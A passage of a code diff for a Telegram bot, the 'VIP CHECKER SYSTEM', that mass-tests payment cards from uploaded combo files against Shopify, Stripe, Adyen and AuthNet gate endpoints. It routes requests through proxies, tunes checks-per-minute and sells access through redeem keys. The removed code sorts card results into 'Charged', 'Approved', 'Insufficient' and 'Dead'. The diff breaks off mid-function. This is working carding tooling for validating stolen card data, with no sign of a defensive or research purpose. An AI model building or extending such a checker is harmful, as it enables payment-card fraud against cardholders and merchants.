@@ -9,8 +9,10 @@ import re
 import io
 import sys
 import logging
+import base64
+from html import unescape
 from datetime import datetime, timedelta
-from urllib.parse import quote
+from urllib.parse import urlparse, quote, urlencode
 import telegram
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, LinkPreviewOptions
 from telegram.ext import Application, CallbackQueryHandler, MessageHandler, filters, ContextTypes, Defaults
@@ -47,10 +49,11 @@ def _patched_to_dict(self, *args, **kwargs):
 _original_inline_keyboard_button.to_dict = _patched_to_dict
 
 logging.basicConfig(stream=sys.stdout, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
-logger = logging.getLogger("VIP_BOT_V2")
+logger = logging.getLogger("VIP_BOT")
 
 BOT_TOKEN = os.getenv('BOT_TOKEN', '').strip()
 ADMIN_ID = [int(x.strip()) for x in os.getenv("ADMIN_ID", "8879293808,8170592405").split(",") if x.strip()]
+GITHUB_TOKEN = os.getenv("GITHUB_TOKEN", "").strip()
 
 JOIN_CHANNEL_ID = os.getenv("JOIN_CHANNEL_ID", "0").strip()
 JOIN_GROUP_ID = os.getenv("JOIN_GROUP_ID", "0").strip()
@@ -82,27 +85,19 @@ ADYEN_API_URL = 'https://gates.valyrian.cc/triumph/check'
 STRIPE_API_URL = 'https://gates.valyrian.cc/stripe1/check'
 AUTHNET_API_URL = 'https://authnet-4b3p.vercel.app/calc'
 GITHUB_SITES_URL = os.getenv("GITHUB_SITES_URL", "https://raw.githubusercontent.com/7Tqk/New-bot-tele/refs/heads/main/sites.txt")
+GITHUB_API_SITES_URL = os.getenv("GITHUB_API_SITES_URL", "")
 KEYS_FILE = "redeem_keys.json"
 
-# ==================== PERFORMANCE V2 SETTINGS ====================
-CPM_TARGET = int(os.getenv("CPM_TARGET", "80"))
-MIN_DELAY = float(os.getenv("MIN_DELAY", "0.05"))
+CPM_TARGET = int(os.getenv("CPM_TARGET", "30"))
+MIN_DELAY = float(os.getenv("MIN_DELAY", "0.5"))
 MAX_DELAY = float(os.getenv("MAX_DELAY", "2.0"))
 
-WORKERS_CONFIG = {
-    "Shopify": lambda: random.randint(25, 50),
-    "Adyen": 35,
-    "Stripe": 30,
-    "AuthNet": 1
-}
-
-API_TIMEOUT = 35
-HIT_DELAY = 0.3
-RETRY_ATTEMPTS = 3
+WORKERS = max(1, min(50, CPM_TARGET // 10))
+API_TIMEOUT = 60
+HIT_DELAY = 1.0
 
 _SITE_ERRORS_COUNT = {}
-_MAX_SITE_ERRORS = 5
-_CIRCUIT_BREAKERS = {}
+_MAX_SITE_ERRORS = 3
 _JOIN_CACHE = {}
 _MAINTENANCE_MODE = False
 
@@ -119,6 +114,170 @@ ACTIVE_MTXT_PROCESSES = {}
 PENDING_FILES = {}
 
 TEST_CARD = "4111111111111111|12|2027|123"
+
+def sf(text) -> str:
+    if text is None: return ""
+    res = ""
+    in_tag = False
+    for c in str(text):
+        if c == '<':
+            in_tag = True
+            res += c
+            continue
+        if c == '>':
+            in_tag = False
+            res += c
+            continue
+        if in_tag:
+            res += c
+            continue
+        if 'A' <= c <= 'Z': res += chr(ord(c) - 65 + 0x1D5D4)
+        elif 'a' <= c <= 'z': res += chr(ord(c) - 97 + 0x1D5EE)
+        elif '0' <= c <= '9': res += chr(ord(c) - 48 + 0x1D7CE)
+        else: res += c
+    return res
+
+def unsf(text) -> str:
+    if text is None: return ""
+    res = ""
+    for c in str(text):
+        o = ord(c)
+        if 0x1D5D4 <= o <= 0x1D5ED: res += chr(o - 0x1D5D4 + 65)
+        elif 0x1D5EE <= o <= 0x1D607: res += chr(o - 0x1D5EE + 97)
+        elif 0x1D7CE <= o <= 0x1D7D7: res += chr(o - 0x1D7CE + 48)
+        else: res += c
+    return res
+
+def escape_html(text):
+    if not text: return "Unknown"
+    return str(text).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
+
+CE_CROWN = '<tg-emoji emoji-id="5217822164362739968">👑</tg-emoji>'
+CE_DIAMOND = '<tg-emoji emoji-id="5427168083074628963">💎</tg-emoji>'
+CE_MIC = '<tg-emoji emoji-id="5224736245665511429">🎤</tg-emoji>'
+CE_SMILE = '<tg-emoji emoji-id="5461117441612462242">🙂</tg-emoji>'
+CE_CHART = '<tg-emoji emoji-id="5246762912428603768">📉</tg-emoji>'
+CE_GLASSES = '<tg-emoji emoji-id="5391112412445288650">🥸</tg-emoji>'
+CE_CONTAINER = '<tg-emoji emoji-id="5269531045165816230">🤡</tg-emoji>'
+CE_CLOWN = CE_CONTAINER
+CE_FLY = '<tg-emoji emoji-id="5231449120635370684">💸</tg-emoji>'
+CE_SHIELD = '<tg-emoji emoji-id="5251203410396458957">🛡️</tg-emoji>'
+CE_SEARCH = '<tg-emoji emoji-id="5231012545799666522">🔍</tg-emoji>'
+switch_emoji = '<tg-emoji emoji-id="5325547803936572038">✨</tg-emoji>'
+CE_SPARKLES = switch_emoji
+CE_GAME = '<tg-emoji emoji-id="5361741454685256344">🎮</tg-emoji>'
+CE_MEDAL = '<tg-emoji emoji-id="5440539497383087970">🥇</tg-emoji>'
+CE_CALENDAR = '<tg-emoji emoji-id="5413879192267805083">🗓️</tg-emoji>'
+CE_CLIP = '<tg-emoji emoji-id="5305265301917549162">📎</tg-emoji>'
+CE_HOURGLASS = '<tg-emoji emoji-id="5386367538735104399">⌛</tg-emoji>'
+CE_STAR = '<tg-emoji emoji-id="5794073296492303710">⭐</tg-emoji>'
+CE_THINK1 = '<tg-emoji emoji-id="5917785839428967062">🤔</tg-emoji>'
+CE_FLASH = '<tg-emoji emoji-id="5445388803223091254">⚡️</tg-emoji>'
+CE_TEARS = '<tg-emoji emoji-id="6201792892634140208">🥲</tg-emoji>'
+CE_SHY = '<tg-emoji emoji-id="6201647288947839133">🤭</tg-emoji>'
+CE_CHECK = '<tg-emoji emoji-id="5445189224682779974"><b>✔️</b></tg-emoji>'
+CE_DOWN = '<tg-emoji emoji-id="5445358884480916784">🔽</tg-emoji>'
+CE_CARD = '<tg-emoji emoji-id="5447453226498552490">💳</tg-emoji>'
+CE_MAIL = '<tg-emoji emoji-id="5445163772706582819">📬</tg-emoji>'
+CE_MAN = '<tg-emoji emoji-id="5447311106030726740">👨‍🦰</tg-emoji>'
+CE_CASH = '<tg-emoji emoji-id="5409048419211682843">💵</tg-emoji>'
+CE_PARTY = '<tg-emoji emoji-id="5461151367559141950">🎉</tg-emoji>'
+CE_CANDLE = '<tg-emoji emoji-id="5451882707875276247">🕯️</tg-emoji>'
+CE_TOP = '<tg-emoji emoji-id="5415655814079723871">🔝</tg-emoji>'
+CE_GEAR = '<tg-emoji emoji-id="5341715473882955310">⚙️</tg-emoji>'
+CE_SNOW = '<tg-emoji emoji-id="5449449325434266744">❄️</tg-emoji>'
+CE_BOOM = '<tg-emoji emoji-id="5276032951342088188">💥</tg-emoji>'
+
+ISO3_TO_ISO2 = {
+    "ABW": "AW", "AFG": "AF", "AGO": "AO", "AIA": "AI", "ALA": "AX", "ALB": "AL", "AND": "AD", "ARE": "AE",
+    "ARG": "AR", "ARM": "AM", "ASM": "AS", "ATA": "AQ", "ATF": "TF", "ATG": "AG", "AUS": "AU", "AUT": "AT",
+    "AZE": "AZ", "BDI": "BI", "BEL": "BE", "BEN": "BJ", "BES": "BQ", "BFA": "BF", "BGD": "BD", "BGR": "BG",
+    "BHR": "BH", "BHS": "BS", "BIH": "BA", "BLM": "BL", "BLR": "BY", "BLZ": "BZ", "BMU": "BM", "BOL": "BO",
+    "BRA": "BR", "BRB": "BB", "BRN": "BN", "BTN": "BT", "BVT": "BV", "BWA": "BW", "CAF": "CF", "CAN": "CA",
+    "CCK": "CC", "CHE": "CH", "CHL": "CL", "CHN": "CN", "CIV": "CI", "CMR": "CM", "COD": "CD", "COG": "CG",
+    "COK": "CK", "COL": "CO", "COM": "KM", "CPV": "CV", "CRI": "CR", "CUB": "CU", "CUW": "CW", "CXR": "CX",
+    "CYM": "KY", "CYP": "CY", "CZE": "CZ", "DEU": "DE", "DJI": "DJ", "DMA": "DM", "DNK": "DK", "DOM": "DO",
+    "DZA": "DZ", "ECU": "EC", "EGY": "EG", "ERI": "ER", "ESH": "EH", "ESP": "ES", "EST": "EE", "ETH": "ET",
+    "FIN": "FI", "FJI": "FJ", "FLK": "FK", "FRA": "FR", "FRO": "FO", "FSM": "FM", "GAB": "GA", "GBR": "GB",
+    "GEO": "GE", "GGY": "GG", "GHA": "GH", "GIB": "GI", "GIN": "GN", "GLP": "GP", "GMB": "GM", "GNB": "GW",
+    "GNQ": "GQ", "GRC": "GR", "GRD": "GD", "GRL": "GL", "GTM": "GT", "GUF": "GF", "GUM": "GU", "GUY": "GY",
+    "HKG": "HK", "HMD": "HM", "HND": "HN", "HRV": "HR", "HTI": "HT", "HUN": "HU", "IDN": "ID", "IMN": "IM",
+    "IND": "IN", "IOT": "IO", "IRL": "IE", "IRN": "IR", "IRQ": "IQ", "ISL": "IS", "ISR": "IL", "ITA": "IT",
+    "JAM": "JM", "JEY": "JE", "JOR": "JO", "JPN": "JP", "KAZ": "KZ", "KEN": "KE", "KGZ": "KG", "KHM": "KH",
+    "KIR": "KI", "KNA": "KN", "KOR": "KR", "KWT": "KW", "LAO": "LA", "LBN": "LB", "LBR": "LR", "LBY": "LY",
+    "LCA": "LC", "LIE": "LI", "LKA": "LK", "LSO": "LS", "LTU": "LT", "LUX": "LU", "LVA": "LV", "MAC": "MO",
+    "MAF": "MF", "MAR": "MA", "MCO": "MC", "MDA": "MD", "MDG": "MG", "MDV": "MV", "MEX": "MX", "MHL": "MH",
+    "MKD": "MK", "MLI": "ML", "MLT": "MT", "MMR": "MM", "MNE": "ME", "MNG": "MN", "MNP": "MP", "MOZ": "MZ",
+    "MRT": "MR", "MSR": "MS", "MTQ": "MQ", "MUS": "MU", "MWI": "MW", "MYS": "MY", "MYT": "YT", "NAM": "NA",
+    "NCL": "NC", "NER": "NE", "NFK": "NF", "NGA": "NG", "NIC": "NI", "NIU": "NU", "NLD": "NL", "NOR": "NO",
+    "NPL": "NP", "NRU": "NR", "NZL": "NZ", "OMN": "OM", "PAK": "PK", "PAN": "PA", "PCN": "PN", "PER": "PE",
+    "PHL": "PH", "PLW": "PW", "PNG": "PG", "POL": "PL", "PRI": "PR", "PRK": "KP", "PRT": "PT", "PRY": "PY",
+    "PSE": "PS", "PYF": "PF", "QAT": "QA", "REU": "RE", "ROU": "RO", "RUS": "RU", "RWA": "RW", "SAU": "SA",
+    "SDN": "SD", "SEN": "SN", "SGP": "SG", "SGS": "GS", "SHN": "SH", "SJM": "SJ", "SLB": "SB", "SLE": "SL",
+    "SLV": "SV", "SMR": "SM", "SOM": "SO", "SPM": "PM", "SRB": "RS", "SSD": "SS", "STP": "ST", "SUR": "SR",
+    "SVK": "SK", "SVN": "SI", "SWE": "SE", "SWZ": "SZ", "SXM": "SX", "SYC": "SC", "SYR": "SY", "TCA": "TC",
+    "TCD": "TD", "TGO": "TG", "THA": "TH", "TJK": "TJ", "TKL": "TK", "TKM": "TM", "TLS": "TL", "TON": "TO",
+    "TTO": "TT", "TUN": "TN", "TUR": "TR", "TUV": "TV", "TWN": "TW", "TZA": "TZ", "UGA": "UG", "UKR": "UA",
+    "UMI": "UM", "URY": "UY", "USA": "US", "UZB": "UZ", "VAT": "VA", "VCT": "VC", "VEN": "VE", "VGB": "VG",
+    "VIR": "VI", "VNM": "VN", "VUT": "VU", "WLF": "WF", "WSM": "WS", "YEM": "YE", "ZAF": "ZA", "ZMB": "ZM",
+    "ZWE": "ZW"
+}
+
+COUNTRY_NAME_TO_CODE = {
+    "AFGHANISTAN": "AF", "ALAND ISLANDS": "AX", "ALBANIA": "AL", "ALGERIA": "DZ", "AMERICAN SAMOA": "AS",
+    "ANDORRA": "AD", "ANGOLA": "AO", "ANGUILLA": "AI", "ANTARCTICA": "AQ", "ANTIGUA AND BARBUDA": "AG",
+    "ARGENTINA": "AR", "ARMENIA": "AM", "ARUBA": "AW", "AUSTRALIA": "AU", "AUSTRIA": "AT", "AZERBAIJAN": "AZ",
+    "BAHAMAS": "BS", "BAHRAIN": "BH", "BANGLADESH": "BD", "BARBADOS": "BB", "BELARUS": "BY", "BELGIUM": "BE",
+    "BELIZE": "BZ", "BENIN": "BJ", "BERMUDA": "BM", "BHUTAN": "BT", "BOLIVIA": "BO", "BOSNIA AND HERZEGOVINA": "BA",
+    "BOTSWANA": "BW", "BOUVET ISLAND": "BV", "BRAZIL": "BR", "BRITISH INDIAN OCEAN TERRITORY": "IO",
+    "BRUNEI DARUSSALAM": "BN", "BULGARIA": "BG", "BURKINA FASO": "BF", "BURUNDI": "BI", "CAMBODIA": "KH",
+    "CAMEROON": "CM", "CANADA": "CA", "CAPE VERDE": "CV", "CAYMAN ISLANDS": "KY", "CENTRAL AFRICAN REPUBLIC": "CF",
+    "CHAD": "TD", "CHILE": "CL", "CHINA": "CN", "CHRISTMAS ISLAND": "CX", "COCOS (KEELING) ISLANDS": "CC",
+    "COLOMBIA": "CO", "COMOROS": "KM", "CONGO": "CG", "CONGO, THE DEMOCRATIC REPUBLIC OF THE": "CD",
+    "COOK ISLANDS": "CK", "COSTA RICA": "CR", "COTE D'IVOIRE": "CI", "CROATIA": "HR", "CUBA": "CU", "CYPRUS": "CY",
+    "CZECH REPUBLIC": "CZ", "CZECHIA": "CZ", "DENMARK": "DK", "DJIBOUTI": "DJ", "DOMINICA": "DM", "DOMINICAN REPUBLIC": "DO",
+    "ECUADOR": "EC", "EGYPT": "EG", "EL SALVADOR": "SV", "EQUATORIAL GUINEA": "GQ", "ERITREA": "ER", "ESTONIA": "EE",
+    "ETHIOPIA": "ET", "FALKLAND ISLANDS (MALVINAS)": "FK", "FAROE ISLANDS": "FO", "FIJI": "FJ", "FINLAND": "FI",
+    "FRANCE": "FR", "FRENCH GUIANA": "GF", "FRENCH POLYNESIA": "PF", "FRENCH SOUTHERN TERRITORIES": "TF",
+    "GABON": "GA", "GAMBIA": "GM", "GEORGIA": "GE", "GERMANY": "DE", "GHANA": "GH", "GIBRALTAR": "GI",
+    "GREECE": "GR", "GREENLAND": "GL", "GRENADA": "GD", "GUADELOUPE": "GP", "GUAM": "GU", "GUATEMALA": "GT",
+    "GUERNSEY": "GG", "GUINEA": "GN", "GUINEA-BISSAU": "GW", "GUYANA": "GY", "HAITI": "HT", "HEARD ISLAND AND MCDONALD ISLANDS": "HM",
+    "HOLY SEE (VATICAN CITY STATE)": "VA", "VATICAN CITY": "VA", "HONDURAS": "HN", "HONG KONG": "HK", "HUNGARY": "HU", "ICELAND": "IS",
+    "INDIA": "IN", "INDONESIA": "ID", "IRAN, ISLAMIC REPUBLIC OF": "IR", "IRAN": "IR", "IRAQ": "IQ", "IRELAND": "IE",
+    "ISLE OF Man": "IM", "ISRAEL": "IL", "ITALY": "IT", "JAMAICA": "JM", "JAPAN": "JP", "JERSEY": "JE",
+    "JORDAN": "JO", "KAZAKHSTAN": "KZ", "KENYA": "KE", "KIRIBATI": "KI", "KOREA, DEMOCRATIC PEOPLE'S REPUBLIC OF": "KP",
+    "KOREA, REPUBLIC OF": "KR", "SOUTH KOREA": "KR", "KOREA": "KR", "KUWAIT": "KW", "KYRGYZSTAN": "KG",
+    "LAO PEOPLE'S DEMOCRATIC REPUBLIC": "LA", "LAOS": "LA", "LATVIA": "LV", "LEBANON": "LB", "LESOTHO": "LS",
+    "LIBERIA": "LR", "LIBYAN ARAB JAMAHIRIYA": "LY", "LIBYA": "LY", "LIECHTENSTEIN": "LI", "LITHUANIA": "LT",
+    "LUXEMBOURG": "LU", "MACAO": "MO", "MACAU": "MO", "MACEDONIA, THE FORMER YUGOSLAV REPUBLIC OF": "MK",
+    "NORTH MACEDONIA": "MK", "MADAGASCAR": "MG", "MALAWI": "MW", "MALAYSIA": "MY", "MALDIVES": "MV",
+    "MALI": "ML", "MALTA": "MT", "MARSHALL ISLANDS": "MH", "MARTINIQUE": "MQ", "MAURITANIA": "MR",
+    "MAURITIUS": "MU", "MAYOTTE": "YT", "MEXICO": "MX", "MICRONESIA, FEDERATED STATES OF": "FM",
+    "MOLDOVA, REPUBLIC OF": "MD", "MOLDOVA": "MD", "MONACO": "MC", "MONGOLIA": "MN", "MONTENEGRO": "ME",
+    "MONTSERRAT": "MS", "MOROCCO": "MA", "MOZAMBIQUE": "MZ", "MYANMAR": "MM", "NAMIBIA": "NA", "NAURU": "NR",
+    "NEPAL": "NP", "NETHERLANDS": "NL", "NETHERLANDS ANTILLES": "AN", "NEW CALEDONIA": "NC", "NEW ZEALAND": "NZ",
+    "NICARAGUA": "NI", "NIGER": "NE", "NIGERIA": "NG", "NIUE": "NU", "NORFOLK ISLAND": "NF", "NORTHERN MARIANA ISLANDS": "MP",
+    "NORWAY": "NO", "OMAN": "OM", "PAKISTAN": "PK", "PANAMA": "PA", "PCN": "PN", "PER": "PE",
+    "PHL": "PH", "PLW": "PW", "PNG": "PG", "POLAND": "PL", "PRI": "PR", "PRK": "KP", "PRT": "PT", "PRY": "PY",
+    "PSE": "PS", "PYF": "PF", "QAT": "QA", "REU": "RE", "ROU": "RO", "RUSSIAN FEDERATION": "RU", "RUSSIA": "RU",
+    "RWANDA": "RW", "SAINT HELENA": "SH", "SAINT KITTS AND NEVIS": "KN", "SAINT LUCIA": "LC",
+    "SAINT PIERRE AND MIQUELON": "PM", "SAINT VINCENT AND THE GRENADINES": "VC", "SAMOA": "WS",
+    "SAN MARINO": "SM", "SAO TOME AND PRINCIPE": "ST", "SAUDI ARABIA": "SA", "SENEGAL": "SN",
+    "SERBIA": "RS", "SEYCHELLES": "SC", "SIERRA LEONE": "SL", "SINGAPORE": "SG", "SLOVAKIA": "SK",
+    "SLOVENIA": "SI", "SOLOMON ISLANDS": "SB", "SOMALIA": "SO", "SOUTH AFRICA": "ZA",
+    "SOUTH GEORGIA AND THE SOUTH SANDWICH ISLANDS": "GS", "SPAIN": "ES", "SRI LANKA": "LK",
+    "SUDAN": "SD", "SURINAME": "SR", "SVALBARD AND JAN MAYEN": "SJ", "SWAZILAND": "SZ", "ESWATINI": "SZ",
+    "SWEDEN": "SE", "SWITZERLAND": "CH", "SYRIAN ARAB REPUBLIC": "SY", "SYRIA": "SY", "TAIWAN, PROVINCE OF CHINA": "TW",
+    "TAIWAN": "TW", "TAJIKISTAN": "TJ", "TANZANIA, UNITED REPUBLIC OF": "TZ", "TANZANIA": "TZ", "THAILAND": "TH",
+    "TIMOR-LESTE": "TL", "TOGO": "TG", "TOKELAU": "TK", "TONGA": "TO", "TRINIDAD AND TOBAGO": "TT",
+    "TUNISIA": "TN", "TURKEY": "TR", "TURKMENISTAN": "TM", "TURKS AND CAICOS ISLANDS": "TC", "TUVALU": "TV",
+    "UGANDA": "UG", "UKRAINE": "UA", "UNITED ARAB EMIRATES": "AE", "UAE": "AE", "UNITED KINGDOM": "GB",
+    "UNITED STATES": "US", "UNITED STATES OF AMERICA": "US", "USA": "US", "UK": "GB", "GB": "GB",
+    "UNITED STATES MINOR OUTLYING ISLANDS": "UM", "URUGUAY": "UY", "UZBEKISTAN": "UZ", "VANUATU": "VU",
+    "VENEZUELA": "VE", "VIET NAM": "VN", "VIETNAM": "VN", "VIRGIN ISLANDS, BRITISH": "VG",
+    "VIRGIN ISLANDS, U.S.": "VI", "WALLIS AND FUTUNA": "WF", "WESTERN SAHARA": "EH", "YEMEN": "YE",
+    "ZAMBIA": "ZM", "ZIMBABWE": "ZW"
+}
 
 def get_flag_emoji(country_code, fallback="🏳️"):
     if not country_code: return fallback
@@ -286,16 +445,8 @@ _USER_HTTP_SESSIONS = {}
 async def get_user_http_session(uid):
     key = f"{uid}_msp"
     if key not in _USER_HTTP_SESSIONS or _USER_HTTP_SESSIONS[key].closed:
-        connector = aiohttp.TCPConnector(
-            limit=100, limit_per_host=30, ssl=False,
-            enable_cleanup_closed=True, force_close=False,
-            ttl_dns_cache=600, use_dns_cache=True, family=0
-        )
-        timeout = aiohttp.ClientTimeout(total=60, connect=15, sock_read=30)
-        _USER_HTTP_SESSIONS[key] = aiohttp.ClientSession(
-            connector=connector, timeout=timeout,
-            headers={"Accept": "application/json", "Accept-Language": "en-US,en;q=0.9", "Connection": "keep-alive"}
-        )
+        connector = aiohttp.TCPConnector(limit=WORKERS + 20, ssl=False, enable_cleanup_closed=True, force_close=False, ttl_dns_cache=300)
+        _USER_HTTP_SESSIONS[key] = aiohttp.ClientSession(connector=connector)
     return _USER_HTTP_SESSIONS[key]
 
 async def cleanup_user_http_session(uid):
@@ -327,12 +478,16 @@ def parse_proxy_format(proxy):
     pt, proxy = (pm.group(1).lower(), pm.group(2)) if pm else ('http', proxy)
     if 'socks' in pt:
         return None
+    # Format: username:password@host:port
     if re.match(r'^([^:@]+):([^@]+)@([^:@]+):(\d+)$', proxy):
         u, pw, h, p = re.match(r'^([^:@]+):([^@]+)@([^:@]+):(\d+)$', proxy).groups()
+    # Format: host:port:username:password
     elif re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy):
         h, p, u, pw = re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy).groups()
+    # Format: username:password@host:port (with protocol already stripped)
     elif re.match(r'^([^@:]+):([^@]+)@([^:@]+):(\d+)$', proxy):
         u, pw, h, p = re.match(r'^([^@:]+):([^@]+)@([^:@]+):(\d+)$', proxy).groups()
+    # Format: host:port only (no auth)
     elif re.match(r'^([^:@]+):(\d+)$', proxy):
         h, p = re.match(r'^([^:@]+):(\d+)$', proxy).groups()
         u = pw = ''
@@ -395,7 +550,7 @@ async def is_user_joined(uid, bot):
 
 async def send_welcome_menu(update_or_bot, uid, plan, limit):
     admin_panel = f"\n\n<b>{CE_GLASSES} {sf('Admin Panel')}:</b>\n ├ {CE_CANDLE} /gen {sf('[plan] [qty]')} - {sf('Generate Keys')}\n ├ {CE_CANDLE} /validate {sf('[key]')} - {sf('Check Key')}\n ├ {CE_CANDLE} /users - {sf('System Status')}\n ├ {CE_CANDLE} /chkpxy - {sf('Test Proxies')}\n ╰ {CE_CANDLE} /maint - {sf('Maintenance Mode')}" if uid in ADMIN_ID else ""
-    t = f"""<b>━━━ {CE_CROWN} {sf('VIP CHECKER SYSTEM V2')} {CE_CROWN} ━━━</b>
+    t = f"""<b>━━━ {CE_CROWN} {sf('VIP CHECKER SYSTEM')} {CE_CROWN} ━━━</b>
 
 <b>{CE_TOP} {sf('Checker Engine')}:</b>
  ╰ <i>{sf('Send a combo file to auto-start mass check')}</i>
@@ -452,7 +607,7 @@ def clean_bin_data(data):
     if len(country_code) == 3:
         country_code = ISO3_TO_ISO2.get(country_code, country_code[:2])
     flag = data.get("flag", "")
-    if not flag or str(flag).strip() in ["", "🏳️", "-"]:
+    if not flag or str(flag).strip() in ["", "\U0001f3f3\ufe0f", "-"]:
         flag = get_flag_emoji(country_code)
     return {
         "brand": str(data.get("brand", "-")).upper().strip(),
@@ -550,123 +705,7 @@ async def get_bin_info(bin_code, session=None):
             _BIN_CACHE[b6] = parsed
             return parsed
     except Exception: pass
-    return {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "Unknown", "country_code": "", "flag": "🌐"}
-
-# ==================== API HELPER FUNCTIONS V2 ====================
-
-async def _api_request_with_retry(session, url, proxy_url=None, headers=None, max_retries=3, timeout=API_TIMEOUT):
-    default_headers = {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
-        "Accept": "application/json",
-        "Accept-Language": "en-US,en;q=0.9",
-        "Connection": "keep-alive"
-    }
-    if headers:
-        default_headers.update(headers)
-    last_error = None
-    for attempt in range(max_retries):
-        try:
-            async with session.get(url, headers=default_headers, proxy=proxy_url, timeout=timeout, ssl=False) as resp:
-                text = await resp.text()
-                return resp.status, text
-        except asyncio.TimeoutError:
-            last_error = "Timeout"
-            if attempt < max_retries - 1:
-                wait_time = 0.3 * (2 ** attempt)
-                await asyncio.sleep(wait_time)
-            continue
-        except aiohttp.ClientProxyConnectionError:
-            last_error = "Proxy Connection Failed"
-            if attempt < max_retries - 1:
-                await asyncio.sleep(0.2)
-            continue
-        except aiohttp.ClientHttpProxyError as e:
-            status = getattr(e, 'status', '?')
-            last_error = f"Proxy Error {status}"
-            break
-        except Exception as e:
-            last_error = str(e)[:50]
-            if attempt < max_retries - 1:
-                await asyncio.sleep(0.2)
-            continue
-    return 0, f"Request Failed: {last_error}"
-
-def _parse_api_response(text_data):
-    gt = "Unknown"
-    pr = None
-    rm = text_data.strip()
-    api_status = None
-    try:
-        rj = json.loads(text_data)
-        rm = str(rj.get('response_msg',
-                 rj.get('result',
-                 rj.get('Response',
-                 rj.get('message',
-                 rj.get('error',
-                 rj.get('msg',
-                 rj.get('status',
-                 rj.get('data', ''))))))))).strip()
-        gt = rj.get('Gateway', rj.get('gateway', 'Unknown'))
-        for k in ['Price', 'price', 'amount', 'Amount', 'amt', 'Amt', 'charged', 'charge', 'total']:
-            if k in rj and rj[k] is not None and str(rj[k]).strip():
-                pr = str(rj[k]).strip()
-                break
-        api_status = str(rj.get('status', rj.get('Status', ''))).lower().strip()
-    except Exception:
-        pass
-    return rm, gt, pr, api_status
-
-def _check_cloudflare_block(text_data):
-    if not text_data: return False
-    lower = text_data.lower()
-    if "<html" in lower and any(k in lower for k in ["cloudflare", "just a moment", "challenge", "captcha", "ddos"]):
-        return True
-    return False
-
-def _determine_status(clean_rm, api_status, gateway_name, price):
-    if api_status:
-        if api_status in ['charged', 'approved', 'success', 'succeeded', 'completed', 'captured', 'paid', 'authorised', 'authorized']:
-            if any(k in clean_rm for k in ['not charged', 'not authorised', 'declined', 'refused']):
-                return 'Dead', price or '-'
-            return 'Charged', price or '-'
-        if api_status in ['declined', 'dead', 'rejected', 'denied', 'failed', 'refused']:
-            return 'Dead', price or '-'
-        if api_status in ['insufficient', 'insufficient_funds', 'nsf']:
-            return 'Insufficient', price or '-'
-    charged_kw = ['charged', 'payment succeeded', 'success', 'captured', 'approved', 'completed',
-                  'authorised', 'authorized', 'payment completed', 'transaction completed', 'accepted',
-                  'payment successful', 'charge complete', 'settled', 'payment confirmed', 'order confirmed', 'paid']
-    if any(k in clean_rm for k in charged_kw):
-        if any(k in clean_rm for k in ['not charged', 'not authorised', 'declined', 'refused']):
-            return 'Dead', price or '-'
-        return 'Charged', price or '-'
-    approved_kw = ['cvv match', 'avs', 'security code match', 'cvv correct', 'invalid_cvv',
-                   'incorrect_cvv', 'cvv2', 'cid', 'match', '3d authenticated', 'challenge completed']
-    if any(k in clean_rm for k in approved_kw):
-        return 'Approved', price or '-'
-    insufficient_kw = ['insufficient funds', 'not enough funds', 'low balance', 'limit exceeded',
-                       'over limit', 'nsf', 'not sufficient', 'no money', 'low funds']
-    if any(k in clean_rm for k in insufficient_kw):
-        return 'Insufficient', price or '-'
-    dead_kw = ['declined', 'do not honor', 'pick up card', 'stolen', 'lost', 'fraud', 'expired',
-               'invalid number', 'invalid card', 'call issuer', 'not permitted', 'not allowed',
-               'restricted', 'refused', 'authentication_required', '3d secure', 'otp required',
-               'incorrect', 'wrong', 'denied', 'rejected', 'blocked', 'banned', 'unauthorized',
-               'forbidden', 'invalid cvv', 'invalid expiry', 'acquirer fraud', 'risk', 'not supported',
-               'unsupported', 'cancelled', 'canceled', 'abandoned', 'processing error', 'card_declined',
-               'processor_declined', 'issuer_declined']
-    if any(k in clean_rm for k in dead_kw):
-        return 'Dead', price or '-'
-    site_error_kw = ['site error', 'gateway error', 'not shopify', 'cart failed', 'step 0', 'step 1',
-                     'session error', 'max retries', 'requires login', 'login required', 'format error',
-                     'timeout', 'connection', 'unreachable', 'server error', 'internal error',
-                     'service unavailable', 'bad gateway', 'empty response', 'no response', 'parse error',
-                     'invalid request', 'missing parameter', 'rate limit', 'too many requests']
-    if any(k in clean_rm for k in site_error_kw):
-        return 'Site Error', None
-    if len(clean_rm) < 3:
-        return 'Site Error', None
-    return 'Dead', price or '-'
+    return {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "Unknown", "country_code": "", "flag": "\U0001f310"}
 
 async def check_shopify_api(api_url, card, site, proxy, session):
     try:
@@ -681,53 +720,232 @@ async def check_shopify_api(api_url, card, site, proxy, session):
         req_url = f"{api_url}?site={site_encoded}&cc={card_encoded}"
         if proxy_encoded:
             req_url += f"&proxy={proxy_encoded}"
-        status_code, text_data = await _api_request_with_retry(
-            session, req_url, proxy_str, max_retries=2, timeout=API_TIMEOUT
-        )
-        if status_code == 0:
-            return {'status': 'Site Error', 'message': text_data, 'card': card}
-        if status_code in [404, 504, 505, 500, 501, 502, 503, 429, 403, 401, 400, 422]:
-            return {'status': 'Site Error', 'message': f'HTTP {status_code}', 'card': card}
-        if _check_cloudflare_block(text_data):
-            return {'status': 'Site Error', 'message': 'Cloudflare Blocked', 'card': card}
-        if not text_data or not text_data.strip():
-            return {'status': 'Site Error', 'message': 'Empty Response', 'card': card}
-        rm, gt, pr, api_status = _parse_api_response(text_data)
-        clean_rm = unsf(rm).lower().strip()
-        status, price = _determine_status(clean_rm, api_status, gt, pr)
-        if status == 'Site Error':
-            return {'status': 'Site Error', 'message': rm or 'Unknown Error', 'card': card}
-        return {'status': status, 'message': rm, 'card': card, 'gateway': gt, 'price': price or '-'}
+        headers = {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+            "Accept": "application/json",
+            "Accept-Language": "en-US,en;q=0.9",
+            "Connection": "keep-alive"
+        }
+        async with session.get(req_url, headers=headers, timeout=API_TIMEOUT, ssl=False) as resp:
+            text_data = await resp.text()
+
+            if resp.status == 404:
